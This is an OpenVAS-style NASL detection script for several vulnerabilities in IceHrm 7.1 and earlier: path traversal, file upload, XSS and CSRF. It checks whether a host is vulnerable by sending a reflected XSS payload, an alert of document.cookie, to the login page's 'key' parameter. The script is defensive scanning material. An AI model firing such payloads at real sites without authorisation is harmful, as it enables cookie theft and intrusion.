if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805032" );
	script_version( "2021-08-10T15:24:26+0000" );
	script_bugtraq_id( 71552 );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2021-08-10 15:24:26 +0000 (Tue, 10 Aug 2021)" );
	script_tag( name: "creation_date", value: "2014-12-17 11:48:55 +0530 (Wed, 17 Dec 2014)" );
	script_name( "IceHrm Multiple Security Vulnerabilities" );
	script_tag( name: "summary", value: "This host is installed with IceHrm and
  is prone to multiple vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "Flaws are due to:

  - The service.php script not properly sanitizing user input, specifically
    path traversal style attacks (e.g. '../../') supplied to the 'file'
    parameter.

  - The index.php script not properly sanitizing user input, specifically path
    traversal style attacks (e.g. '../../') supplied to the 'n' and 'g'
    parameters.

  - The fileupload.php script does not properly verify or sanitize user-uploaded
    files via the 'file_name' POST parameter.

  - The login.php script does not validate input to the 'key' parameter before
    returning it to users.

  - The fileupload_page.php script does not validate input to the 'id',
    'file_group', 'user' and 'msg' parameter before returning it to users.

  - The /data/ folder that is due to the program failing to restrict users
    from making direct requests to profile images for users or employees.

  - The HTTP requests to service.php do not require multiple steps, explicit
    confirmation, or a unique token when performing certain sensitive actions." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker
  to execute arbitrary script code in the context of the vulnerable site,
  potentially allowing the attacker to steal cookie-based authentication
  credentials, upload arbitrary files to the affected application, read and
  write arbitrary files in the context of the user running the affected
  application, and obtain potentially sensitive information." );
	script_tag( name: "affected", value: "IceHrm version 7.1 and prior." );
	script_tag( name: "solution", value: "Upgrade to IceHrm 7.2 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/99242" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/35490" );
	script_xref( name: "URL", value: "http://cxsecurity.com/issue/WLB-2014120041" );
	script_xref( name: "URL", value: "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2014-5215.php" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.icehrm.com" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
serPort = http_get_port( default: 80 );
if(!http_can_host_php( port: serPort )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", "/iceHRM", "/hrm", http_cgi_dirs( port: serPort ) ) {
	if(dir == "/"){
		dir = "";
	}
	req = http_get( item: NASLString( dir, "/app/login.php" ), port: serPort );
	res = http_keepalive_send_recv( port: serPort, data: req );
	if(res && ContainsString( res, ">IceHRM Login<" )){
		url = dir + "/app/login.php?key=';</script><script>alert(document.cookie);</script>";
		if(http_vuln_check( port: serPort, url: url, check_header: TRUE, pattern: "</script><script>alert\\(document.cookie\\);</script>", extra_check: "IceHRM Login" )){
			report = http_report_vuln_url( port: serPort, url: url );
			security_message( port: serPort, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

